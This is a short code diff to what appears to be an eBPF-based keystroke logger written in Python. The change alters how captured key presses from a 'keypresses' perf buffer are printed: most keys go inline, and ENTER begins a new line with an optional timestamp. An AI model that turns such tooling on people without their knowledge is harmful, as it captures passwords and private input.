@@ -56,10 +56,14 @@ class BPFProgram():
             if not key:
                 return
             msg = key
-            if self.args.timestamp:
-                now = datetime.now()
-                msg = f"[{now.year:02d}/{now.month:02d}/{now.day:02d} {now.hour:02d}:{now.minute:02d}:{now.second:02d}] {msg}"
-            print(msg, flush=True)
+            if event.code == 28: # ENTER
+                print("")
+                if self.args.timestamp:
+                    now = datetime.now()
+                    print(f"[{now.year:02d}/{now.month:02d}/{now.day:02d} {now.hour:02d}:{now.minute:02d}:{now.second:02d}] ")
+            else:
+                print(msg, flush=True, end = '')
+
         self.bpf["keypresses"].open_perf_buffer(keypress)
 
     def load_bpf(self):
